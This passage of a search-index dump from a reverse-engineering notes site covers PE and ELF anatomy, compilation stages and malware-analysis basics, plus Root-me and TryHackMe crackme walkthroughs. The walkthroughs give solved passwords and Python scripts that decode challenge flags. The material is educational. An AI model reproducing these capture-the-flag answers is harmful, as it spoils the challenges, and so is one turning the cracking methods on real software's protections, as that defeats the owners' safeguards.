VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; The PE format does not explicitly distinguish between sections and segments. The closest thing PE files have to ELF’s execution view is the DataDirectory , which provides the loader with a shortcut to certain portions of the binary needed for setting up the execution. But there is no separate program header table; the section header table is used for both linking and loading Sections  Many of the sections in PE files are directly comparable to ELF sections, often even having (almost) the same name. nina@tardis:~/Development/pe$ objdump -x hello.exe ... Sections: Idx Name Size VMA LMA File off Algn 0 .text 00000db8 0000000140001000 0000000140001000 00000400 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE 1 .rdata 00000d72 0000000140002000 0000000140002000 00001200 2**4 CONTENTS, ALLOC, LOAD, READONLY, DATA 2 .data 00000200 0000000140003000 0000000140003000 00002000 2**4 CONTENTS, ALLOC, LOAD, DATA 3 .pdata 00000168 0000000140004000 0000000140004000 00002200 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA 4 .rsrc 000001e0 0000000140005000 0000000140005000 00002400 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA 5 .reloc 0000001c 0000000140006000 0000000140006000 00002600 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA .edata and .idata  The most important PE sections that have no direct equivalent in ELF are .edata and .idata , which contain tables of exported and imported functions. The export directory and import directory entries in the DataDirectory array refer to these sections. The .idata section specifies which symbols (functions and data) the binary imports from shared libraries (DLLs in Windows terminology). The .edata section lists the symbols and their addresses that the binary exports. To resolve references to external symbols, the loader needs to match up the required imports with the export table of the DLL that provides the required symbols. When these sections are not present (often the case), they are usually merged into .rdata , but their contents and workings remain the same. When the loader resolves dependencies, it writes the resolved addresses into the Import Address Table (IAT). Similar to the Global Offset Table...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f9ab895a58498538e4d60485094b0970",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-arm-1337",
    "t": "ELF ARM crackme 1337 ",
    "c": "ELF ARM crackme 1337  Root-me challenge : If the binary file sends you 1337 you got the right password. ARM, ELF 32-bit LSB Decompile the code int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+4h] [bp-30h]@2 const char **v5; // [sp+8h] [bp-2Ch]@1 int v6; // [sp+14h] [bp-20h]@3 int v7; // [sp+18h] [bp-1Ch]@3 int v8; // [sp+18h] [bp-1Ch]@6 int i; // [sp+18h] [bp-1Ch]@9 signed int v10; // [sp+1Ch] [bp-18h]@6 v5 = argv; if ( argc > 1 ) { v7 = 0; v6 = xmalloc(32); while ( v7 != 8 ) { *(_DWORD *)(v6 + 4 * v7) = xmalloc(32); memset(*(_DWORD *)(v6 + 4 * v7++), 10, 32); } *(_DWORD *)(v6 + 32) = 0; v8 = 0; v10 = 65; while ( v8 != 31 ) *(_BYTE *)(*(_DWORD *)(v6 + 12) + v8++) = v10++; *(_BYTE *)(*(_DWORD *)(v6 + 12) + 31) = 0; for ( i = 0; v5[1][i]; ++i ) { if ( v5[1][i] != *(_BYTE *)(*(_DWORD *)(v6 + 12) + i) ) return -1; } v4 = 1337; } else { v4 = -1; } return v4; } Analysis The program receives the code from argv . Uses v5 to compare the password with. Space was reserved for 32 characters. v6 is used to store the password. 65 is A in ascii code. The password is 32 letters from A up to 32 characters. Resources  ARM : architecture & assembleur ARM",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "03e219d11e19b3669520897a595d9d3a",
    "u": "https://reverse.tymyrddin.dev/docs/thm/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Identifying and analysing malicious payloads of various formats embedded in PDFs, EXEs and Microsoft Office Macros. Identifying obfuscated code and packed files, and analysing these. Analysing the memory dump of a PC that became infected with the Jigsaw ransomware in the real-world using Volatility. Why?  Practice with real-world example cases. How?  Analysing malicious pdfs Analysing malicious Microsoft Office macros I hope you packed your bags THM Dunkle Materie",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8e5418a1468b4379c095777cfdb80af5",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/godot-mono",
    "t": "Godot mono ",
    "c": "Godot mono  root-me challenge Godot - Mono : Your friend, even more frustrated after you managed to retrieve the message from the island for the second time , decides to take further steps to prevent you from cheating. Prove to him that his measures to stop you are futile. Decompile the .mono/assemblies/Release/RootMeCrackme.dll file using dotPeek. Use the FlagLabel.cs script to convert the ASCII value of the SomethingNotInterestingAtAll variable to String . Resources  dotPeek Godot Docs: C# basics",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b7790ee92cd7f90a0ce81ea3fa5f7cbe",
    "u": "https://reverse.tymyrddin.dev/docs/binary/anatomy",
    "t": "Anatomy of binaries ",
    "c": "Anatomy of binaries  C compilation process  The preprocessing phase expands any #define and #include directives in the source file so that pure C code is ready to be compiled. To explicitly tell gcc to stop after preprocessing and show the intermediate output: nina@tardis:~/Development/anatomy$ gcc -E -P hello.c typedef long unsigned int size_t; typedef __builtin_va_list __gnuc_va_list; typedef unsigned char __u_char; typedef unsigned short int __u_short; typedef unsigned int __u_int; typedef unsigned long int __u_long; typedef signed char __int8_t; ... extern int pclose (FILE *__stream); extern FILE *popen (const char *__command, const char *__modes) __attribute__ ((__malloc__)) __attribute__ ((__malloc__ (pclose, 1))) ; extern char *ctermid (char *__s) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__access__ (__write_only__, 1))); extern void flockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern int ftrylockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ; extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)); extern int __uflow (FILE *); extern int __overflow (FILE *, int); int main(int argc, char *argv[]) { printf(\"%s\", \"Hello, world!\\n\"); return 0; } The compilation phase takes the preprocessed code and translates it into assembly language, , in reasonably human-readable form, with symbolic information intact. Most compilers also perform heavy optimisation in his phase (configurable with switches such as options -O0 through -O3 in gcc . To tell gcc to stop after this stage and store the assembly files to disk, use the -S flag. Pass the option -masm=intel to gcc to have it produce assembly in Intel syntax instead of the default AT&T syntax: nina@tardis:~/Development/anatomy$ gcc -S -masm=intel hello.c nina@tardis:~/Development/anatomy$ ls hello.c hello.s nina@tardis:~/Development/anatomy$ cat hello.s .file \"hello.c\" .intel_syntax noprefix .text .section .rodata .LC0: .string \"Hello, world!\" .text .globl main .type main, @function main: .LFB0: .cfi_startproc endbr64 push rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 mov rbp, rsp .cfi_def_cfa_register 6 sub rsp, 16 mov DWORD PTR -4[rbp], edi mov QWORD PTR -16[rbp], rsi lea rax, .LC0[rip] mov rdi, rax call puts@PLT mov eax, 0 leave .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \"GCC: (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0\" .section .note.GNU-stack,\"\",@progbits .section .note.gnu.property,\"a\" .align 8 .long 1f - 0f .long 4f - 1f .long 5 0: .string \"GNU\" 1: .align 8 .long 0xc0000002 .long 3f - 2f 2: .long 0x3 3: .align 8 4: nina@tardis:~/Development/anatomy$ The input of the assembly phase is the set of assembly language files generated in the compilation phase, and the output is a set of object files (modules). Object files contain machine instructions executable by the processor. Typically, each source file corresponds to one assembly file, and each assembly file corresponds to one object file. To generate an object file, pass the -c flag to gcc : nina@tardis:~/Development/anatomy$ gcc -c hello.c nina@tardis:~/Development/anatomy$ ls hello.c hello.o hello.s nina@tardis:~/Development/anatomy$ file hello.o hello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped The term relocatable in the file output indicates it is an object file and not an executable. The linking phase links together all the object files into a single binary executable. The linking phase usually includes an additional optimisation pass, called link-time optimisation (LTO). Static libraries (extension .a on Linux), are merged into the binary executable, allowing any references to them to be resolved entirely. Dynamic libraries, shared in memory among all programs that run on a system are loaded into memory only once, and any binary that wants to use the library needs to use the shared copy. to produce a complete binary executable, use gcc without switches: nina@tardis:~/Development/anatomy$ gcc hello.c nina@tardis:~/Development/anatomy$ ls a.out hello.c hello.o hello.s nina@tardis:~/Development/anatomy$ file a.out a.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c8215b952047b1c7a485d388b97c85936de85da4, for GNU/Linux 3.2.0, not stripped To override the default naming, pass the -o switch, followed by a name for the output file. Symbols and stripping  When compiling a program, compilers create and use symbols, which keep track of high-level functions and variables and record which binary code and data correspond to each symbol. To view the symbols in an a.out binary: nina@tardis:~/Development/anatomy$ readelf --syms a.out Symbol table '.dynsym' contains 7 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _[...]@GLIBC_2.34 (2) 2: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3) 4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 5: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 6: 0000000000000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.2.5 (3) Symbol table '.symtab' contains 36 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS Scrt1.o 2: 000000000000038c 32 OBJECT LOCAL DEFAULT 4 __abi_tag 3: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 4: 0000000000001090 0 FUNC LOCAL DEFAULT 16 deregister_tm_clones 5: 00000000000010c0 0 FUNC LOCAL DEFAULT 16 register_tm_clones 6: 0000000000001100 0 FUNC LOCAL DEFAULT 16 __do_global_dtors_aux 7: 0000000000004010 1 OBJECT LOCAL DEFAULT 26 completed.0 8: 0000000000003dc0 0 OBJECT LOCAL DEFAULT 22 __do_global_dtor[...] 9: 0000000000001140 0 FUNC LOCAL DEFAULT 16 frame_dummy 10: 0000000000003db8 0 OBJECT LOCAL DEFAULT 21 __frame_dummy_in[...] 11: 0000000000000000 0 FILE LOCAL DEFAULT ABS hello.c 12: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 13: 00000000000020f0 0 OBJECT LOCAL DEFAULT 20 __FRAME_END__ 14: 0000000000000000 0 FILE LOCAL DEFAULT ABS 15: 0000000000003dc8 0 OBJECT LOCAL DEFAULT 23 _DYNAMIC 16: 0000000000002014 0 NOTYPE LOCAL DEFAULT 19 __GNU_EH_FRAME_HDR 17: 0000000000003fb8 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 18: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_mai[...] 19: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 20: 0000000000004000 0 NOTYPE WEAK DEFAULT 25 data_start 21: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 22: 0000000000004010 0 NOTYPE GLOBAL DEFAULT 25 _edata 23: 0000000000001174 0 FUNC GLOBAL HIDDEN 17 _fini 24: 0000000000004000 0 NOTYPE GLOBAL DEFAULT 25 __data_start 25: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 26: 0000000000004008 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 27: 0000000000002000 4 OBJECT GLOBAL DEFAULT 18 _IO_stdin_used 28: 0000000000004018 0 NOTYPE GLOBAL DEFAULT 26 _end 29: 0000000000001060 38 FUNC GLOBAL DEFAULT 16 _start 30: 0000000000004010 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 31: 0000000000001149 41 FUNC GLOBAL DEFAULT 16 main 32: 0000000000004010 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 33: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 34: 0000000000000000 0 FUNC WEAK DEFAULT UND __cxa_finalize@G[...] 35: 0000000000001000 0 FUNC GLOBAL HIDDEN 12 _init Having a set of well-defined function symbols makes disassembly much easier because each function symbol can be used as a starting point for disassembly. Knowing which parts of a binary belong to which function, and what the function is called, also makes it much easier to compartmentalise and understand what the code is doing. Symbols can be parsed with readelf , or programmatically with a library like libbfd . Stripping a binary removes the symbols which are not needed from a binary’s symbol table. It makes...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "52eb532e25fcf92523290f9d3df8e3fd",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/godot-0",
    "t": "Godot 0 protection ",
    "c": "Godot 0 protection  root-me challenge Godot - 0 protection : Your developer friend has designed a new game that he wants you to test. He explains that the goal is to reach the island of light in the sky. He also tells you that if you ever get there, you have to tell him what is written on the sign on the island as proof, because it is impossible for you to get there. Show him that he is wrong. strings 0_protection.exe Find: script = ExtResource( 3 ) __meta__ = { \"_edit_use_anchors_\": false extends Label func _ready(): var key = [119, 104, 52, 116, 52, 114, 51, 121, 48, 117, 100, 48, 49, 110, 103, 63] var enc = [32, 13, 88, 24, 20, 22, 92, 23, 85, 89, 68, 68, 89, 11, 71, 89, 27, 9, 83, 84, 93, 1, 57, 42, 83, 7, 13, 96, 69, 29, 86, 81, 52, 4, 7, 64, 70] text = \"\" for i in range(len(enc)): text += char(enc[i] ^ key[i % len(key)]) extends Node2D func _ready(): OS.set_window_maximized(true) extends KinematicBody export var mouse_sensitivity = 0.1 Can use python: key = [119, 104, 52, 116, 52, 114, 51, 121, 48, 117, 100, 48, 49, 110, 103, 63] enc = [32, 13, 88, 24, 20, 22, 92, 23, 85, 89, 68, 68, 89, 11, 71, 89, 27, 9, 83, 84, 93, 1, 57, 42, 83, 7, 13, 96, 69, 29, 86, 81, 52, 4, 7, 64, 70] text = \"\" for i in range(len(enc)): text += chr(enc[i] ^ key[i % len(key)]) print(text) Resources  Godot Docs: Introduction Godot Docs: Exporting_projects Godot Docs: GDScript reference",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "51ac679ddb93acfa68c4486e4d770c86",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/wasm-intro",
    "t": "WASM introduction ",
    "c": "WASM introduction  Root-me challenge : Do you know WebAssembly? Find the password that validates this crackme. A Web assembly file is loaded: http://challenge01.root-me.org/cracking/ch41/index.wasm. Decompile index.wasm with tools from the WebAssembly Binary Toolkit. Analysis Look at $check_password code. Password is MD5 hashed. At the end of the file some constant values are defined. Use, for example, the hashes website to decrypt. Enter the decrypted password in the site to get the flag. Resources  wabt instructions.html",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b2b8af47ca6763fa4f5fc013298d303e",
    "u": "https://reverse.tymyrddin.dev/docs/cracking/wasm",
    "t": "WebAssembly (WASM) ",
    "c": "WebAssembly (WASM)  WebAssembly, also called Wasm, is a Web-optimized code format and API (Application Programming Interface) that can improve the performances and capabilities of websites. Version 1.0 of WebAssembly was released in 2017, and became an official W3C standard in 2019. The standard is actively supported by all major browser suppliers. The official list of inside the browser use cases mentions video editing, 3D games, virtual and augmented reality, p2p services, and scientific simulations. Besides making browsers much more powerful than JavaScript could, this standard may even extend the lifespan of websites. WebAssembly is currently being used in mobile and edge based environments with such products as Cloudflare Workers. Files in .wasm format contain low level binary instructions (bytecode), executable at near CPU-native speed by a virtual machine that uses a common stack. The code is packaged in modules, objects that are directly executable by a browser, and each module can be instantiated multiple times. The functions defined inside modules are listed in one dedicated array, or Table, and the corresponding data are contained in another structure, called arraybuffer. Developers can explicitly allocate memory for .wasm code with the Javascript WebAssembly.memory() call. Resources  WebAssembly",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c0c0b6aae33bbe2d09e49ecea4e4feff",
    "u": "https://reverse.tymyrddin.dev/docs/malware/behaviours",
    "t": "Typical behaviours ",
    "c": "Typical behaviours  Malware tends to establish either external network connections or internal connections. External connections allow remote access or for downloading staged payloads from a threat actors’ infrastructure. Meanwhile, internal connections allow for lateral movement, a technique used to extend access to other hosts or applications within the network. Windows malware typically uses registry keys to establish persistence, a technique used by adversaries to discreetly maintain long-term access to a system despite disruptions. A good example is Registry Run Keys, which allows binaries to be automatically executed when a user logs in or the machine boots up. Malware also tends to download (one of the common reasons to establish network connections) or create new files needed for its successful execution.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "001e5a61ae4356903133e99301019885",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/gb-basic",
    "t": "GB basic Game Boy crackme ",
    "c": "GB basic Game Boy crackme  Root-me challenge : An unorthodox architecture. Try to find the secret path to validate this challenge. Press arrows to control the smile, and start to validate. There is no way around reading at least part of the manual in the resources, and installing extra, other tools. Not going to spoil this one. Resources  Game Boy CPU Manual",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9a149324e5f3d7a2ea0de825d3345cdd",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-x86-ptrace",
    "t": "ELF x86 ptrace ",
    "c": "ELF x86 ptrace  Root-me challenge : Compiled with GCC32 4.3.4 on linux gentoo. Use, for example, Ghidra. Search for main() in Functions. Analysis (in Decompiler): (local_1e == local_14[4]) && (local_1d == local_14[5])) && (local_1c == local_14[1])) && (local_1b == local_14[10])) puts(\"\\nGood password !!!\\n\"); Resources  The GNU binary utils Ptrace - process trace SSTIC 06 - Playing with ptrace",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a52516b407aeef1b7673b21d2c30259c",
    "u": "https://reverse.tymyrddin.dev/docs/cracking/windows",
    "t": "Reverse engineering in Windows ",
    "c": "Reverse engineering in Windows  Programs in the Windows environment communicate with the system by using Windows APIs. These APIs are built around the file system, memory management (including processes, the stack, and allocations), the registry hive, network communication, and so forth. Being able to use Windows APIs and their library modules is an advantage when it comes to easily understanding how a program works when seen in its low-level language equivalent.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "df2f0af46ec4f52e2571bb4f80f030d4",
    "u": "https://reverse.tymyrddin.dev/docs/thm/bags",
    "t": "I hope you packed your bags ",
    "c": "THM Room: REMnux I hope you packed your bags  File entropy is very indicative of the suspiciousness of a file and is a prominent characteristic that the tools look for within a Portable Executable (PE). At it’s very simplest, file entropy is a rating that scores how random the data within a PE file is. With a scale of 0 to 8. 0 meaning the less “randomness” of the data in the file, where a scoring towards 8 indicates this data is more “random”. For example, files that are encrypted will have a very high entropy score. Where files that have large chunks of the same data such as 1 s will have a low entropy score. Malware authors use techniques such as encryption or packing to obfuscate their code and to attempt to bypass antivirus. Because of this, these files will have high entropy. If an analyst had 1,000 files, they could rank the files by their entropy scoring, and the files with the higher entropy should be analysed first. Packing/unpacking  The unpacking stub unpacks the original executable into memory, resolves imports, and transfers execution to the OEP Executables have what’s called an entry point. When launched, this entry point is simply the location of the first pieces of code to be executed within the file. When an executable is packed, it must unpack itself before any code can execute. Because of this, packers change the entry point from the original location to what’s called the “Unpacking Stub”. The “Unpacking Stub” will begin to unpack the executable into its original state. Once the program is fully unpacked, the entry point will now relocate back to its normal place to begin executing code. It is only at this point can an analyst begin to understand what the executable is doing as it is now in its true, original form. Identifying packers  Opening a packed executable with tools like OllyDbg and IDA-Pro will produce a warning that the executable may be packed. Packed programs have very few imports (usually LoadLibrary and GetProcAddress ), or no import at all. Many packers leave text signatures inside the packed binary. In some cases, the file command will be able to identify the packer ( UPX compressed , PECompact2 compressed ) Tools like PEiD ( python version ) and pev detect most common packers, cryptors and compilers for PE files. Questions  What is the highest file entropy a file can have? Answer: 8 What is the lowest file entropy a file can have? Answer: 0 Name a common packer that can be used for applications? Answer: UPX",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3281d37d60b876d7556e36f0d282c79a",
    "u": "https://reverse.tymyrddin.dev/docs/malware/packers",
    "t": "Packers ",
    "c": "Packers  Malware is often packed. It produces a smaller version of the executable and more difficult to analyse. A malware analyst will still be able to work with a packed version for a behavioural analysis but for static analysis, an unpacked version may be necessary. The unpacking stub unpacks the original executable into memory, resolves imports, and transfers execution to the OEP Identifying packers  Opening a packed executable with tools like OllyDbg and IDA-Pro will produce a warning that the executable may be packed. Packed programs have very few imports (usually LoadLibrary and GetProcAddress ), or no import at all. Many packers leave text signatures inside the packed binary. In some cases, the file command will be able to identify the packer ( UPX compressed , PECompact2 compressed ) Tools like PEiD ( python version ) and pev detect most common packers, cryptors and compilers for PE files.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c5a619dd44b83fb13f46defa908ca1d6",
    "u": "https://reverse.tymyrddin.dev/docs/malware/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on techniques for determining the functionality, origin and potential impact of a given malware sample such as a virus, worm, trojan horse, rootkit, or backdoor. Real understanding comes by analysing and reverse engineering the malware. Malware is often the foundation of an attack. Why?  Understanding how a malware got past defenses and what it was designed to do once inside an environment can expose behaviour and artifacts that can be used to give a proper response to it; to develop better defences against it; to understand how it varies from other malware; to find similar activity; … How?  History of malware Typical behaviours Purpose of a malware attack Malware signatures Static and dynamic analysis Packers",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "6efbef96040149394a83d8dfaf51eb1e",
    "u": "https://reverse.tymyrddin.dev/docs/cracking/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on techniques for cracking (reverse enigeering) previously made devices, processes, systems, or pieces of software. Why?  Knowledge gained during cracking can help with repurposing obsolete objects, doing security analysis, or learning how something works. These notes can serve as cheatsheets and easy entry level for others. And communication with peers also just feels nice, and improves collaborating with others and other teams. How?  Assessment and static analysis Reverse engineering in Linux Reverse engineering in Windows WebAssembly (WASM)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "be8819325668c3284468820fb0c9f267",
    "u": "https://reverse.tymyrddin.dev/docs/malware/purpose",
    "t": "Purpose of a malware attack ",
    "c": "Purpose of a malware attack  A “targeted” attack is created for a specific purpose against a specific target. Examples are the DarkHotel malware, designed to steal information such as authentication details from government officials, and Stuxnet , the gift that kept (keeps) giving. “Mass campaigns” are the most common type of attacks. These intend to infect as many devices as possible and perform whatever it may - regardless of target. An example is Wannacry , a ransomware that used the Eternalblue exploit. And this is where it gets blurry. Advanced Persistent Threats (APTs) like the Crouching Yeti could be considered a “mass campaign” and specifically targets: Industrial/machinery Manufacturing Pharmaceutical Construction Education Information technology In geopolitical terms, it can be considered a “targeted” attack. And because there is a rather large scope of this variant of malware, it can also be considered as a “mass campaign” attack.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "16e3d4fc63d5f3dbed0030dc220cbcd1",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/godot-bytecode",
    "t": "Godot bytecode ",
    "c": "Godot bytecode  root-me challenge Godot Bytecode : Your friend, frustrated that you managed to retrieve the evidence from the island of his game , challenges you to pull off the same feat once again. Knowing your cracking skills, he has taken steps to stop you. Show him that this is not enough to stop you. Decompile the FlagLabel.gdc file. Can use python: key = [66, 121, 84, 51, 99, 48, 100, 51] enc = [153, 222, 192, 159, 131, 148, 211, 161, 167, 165, 116, 167, 203, 149, 132, 153, 174, 218, 187, 83, 204, 163, 110, 117, 187, 237, 135, 150, 147, 148, 151, 118, 118, 231, 168, 133, 150, 163, 149, 166, 150] hidden_text = \"\" for i in range(len(enc)): hidden_text += chr(enc[i] - key[i % len(key)]) print(hidden_text) Resources  Godot RE Tools",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "eede2e9fd39a65d326d5b97ad574bb66",
    "u": "https://reverse.tymyrddin.dev/docs/cracking/assessment",
    "t": "Assessment and static analysis ",
    "c": "Assessment and static analysis  Initial assessment serves determining what tools and analysis methods will be required. This process also helps in the creation of a strategy for analysing the file. This requires carrying out a light static analysis. Origins  One of the purposes of reverse engineering is to help network administrators prevent similar malware from infiltrating a network. Knowing where a file came from could be helpful in securing the channel used to transmit it. For example, if the file being analysed was an email attachment, network administrators should secure the email server. Existing information  Searching the internet for already existing information can be very helpful. There might be existing analyses that has been done on the file, and determine what behaviours to expect. Viewing the file and extracting its text strings  Using tools like file to view the file help determine the type of file. Extracting readable text from the file with strings also gives hints of what messages, functions, and modules it will use when opened or executed. File information  The type of file is the most important piece of information that sets off the whole analysis. If the file type is a Windows executable, a preset of PE tools will be prepared. If the file type is a Word document, a sandbox environment will have to be installed with Microsoft Office and analysis tools that can read the OLE file format. If the given target for analysis is a website, preparations are likely to involve browser tools that can read HTML and debug Java scripts or Visual Basic scripts. Static analysis  Static analysis will help us make notes of what we will do during dynamic analysis. With knowledge of the assembly language, a disassembled file and its branches can be understood. This allows for preparing the right tools to read, open, and debug the file based on its file type, and understand the file’s structure based on its file format .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2a3156d15dc5e68933f4ce50c9aefbb3",
    "u": "https://reverse.tymyrddin.dev/docs/malware/analysis",
    "t": "Static and dynamic analysis ",
    "c": "Static and dynamic analysis  While static analysis works for the common malware, dynamic analysis is needed for the more sophisticated and advanced kind of malware. Static  Static malware analysis involves examining any given malware sample without actually running or executing the code. This is usually done by determining the signature of the malware binary; the signature is a unique identification for the binary file. Calculating the cryptographic hash of the binary file and understanding each of its components helps determine its signature . The executable of the malware binary file is loaded into a disassembler (for example, IDA) and the machine-executable code is converted to assembly language code. Different techniques can be used, like file fingerprinting, virus scanning, memory dumping, packer detection, and debugging. Dynamic  Dynamic malware analysis involves running the code in a controlled environment. The malware is run in a closed, isolated virtual environment and then its behaviour studied. The intention is to understand its functioning and behaviour and use this knowledge to stop its spread or to remove the infection. Debuggers are used to determine the functionality of the malware executable. Resources  Hashtab Alternatives & Feature Highlights 2022",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a8e60a48459c482b6bee234168f1f3cb",
    "u": "https://reverse.tymyrddin.dev/docs/root-me/elf-mips-basic",
    "t": "ELF MIPS basic crackme ",
    "c": "ELF MIPS basic crackme  Root-me challenge : Find the validation password. Decompile the binary in, for example, Ghidra. Analysis There is no check on the length of the input There is a loop which checks that at indexes 8 - 16 there is an i Check the stack. Find the other characters. The password is 19 characters long. Resources  Exploiting Buffer Overflows on MIPS Architectures - Lyon Yang Reverse Engineering pour Débutants - Dennis Yurichev Taming a Wild Nanomite-protected MIPS Binary With Symbolic Execution - Diary of a reverse-engineer MIPS Green Sheet MIPS Assembly Tutorial",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "634805a2fbf971acb324c1b15965eb69",
    "u": "https://reverse.tymyrddin.dev/docs/cracking/linux",
    "t": "Reverse engineering in Linux ",
    "c": "Reverse engineering in Linux  This is a walkthrough: of: Understanding linux executables Reversing an ELF file Virtualisation in Linux – an analysis of a Windows executable under a Linux host Install VCodium or VSCode, or another IDE, or just use vim . Also, gcc . Create a “hello world!” in C. I named it hello.c : #include <stdio.h> void main(void) { printf (\"hello world!\\n\"); } Compilation  ┌──(kali㉿kali)-[~/Development/C] └─$ gcc -o hello hello.c The hello file is the Linux executable that displays the message “hello world!” in the console. ┌──(kali㉿kali)-[~/Development/C] └─$ ./hello hello world! Identification  ┌──(kali㉿kali)-[~/Development/C] └─$ file hello hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8207bd08cd906af9829fcbadd2a0ae7a35b68546, for GNU/Linux 3.2.0, not stripped It uses a 64-bit ELF file-format. Take a look at text strings: ┌──(kali㉿kali)-[~/Development/C] └─$ strings hello /lib64/ld-linux-x86-64.so.2 puts __libc_start_main __cxa_finalize libc.so.6 GLIBC_2.2.5 GLIBC_2.34 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable PTE1 u+UH hello world! ;*3$\" GCC: (Debian 12.2.0-9) 12.2.0 Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry hello.c __FRAME_END__ _DYNAMIC __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_start_main@GLIBC_2.34 _ITM_deregisterTMCloneTable puts@GLIBC_2.2.5 _edata _fini __data_start __gmon_start__ __dso_handle _IO_stdin_used _end __bss_start main __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@GLIBC_2.2.5 _init .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got.plt .data .bss .comment The strings are listed in order from the start of the file. The first part of the list contains the message and the compiler information. The first two lines show what libraries are used. objdump  Using the -d parameter of the objdump command, disassemble the executable code (AT&T syntax): ┌──(kali㉿kali)-[~/Development/C] └─$ objdump -d hello > disassembly.asm To get Intel syntax, use the -M intel parameter: ┌──(kali㉿kali)-[~/Development/C] └─$ objdump -M intel -d hello > disassembly-intel.asm The disassembly of the code is usually in the .text section. Because this is a gcc-compiled program, skip all the initialisation code and look at the main function where the code is. Moving into dynamic analysis, use ltrace , strace , and gdb . ltrace  ┌──(kali㉿kali)-[~/Development/C] └─$ ltrace ./hello puts(\"hello world!\"hello world! ) = 13 +++ exited (status 13) +++ The output shows a readable code of what the program did. ltrace logged library functions that the program called and received. It called puts to display a message. And it received an exit status of 13 when the program terminated. strace  strace logged every system call that happened, starting from when it was being executed by the system. execve is the first system call that was logged: ┌──(kali㉿kali)-[~/Development/C] └─$ strace ./hello 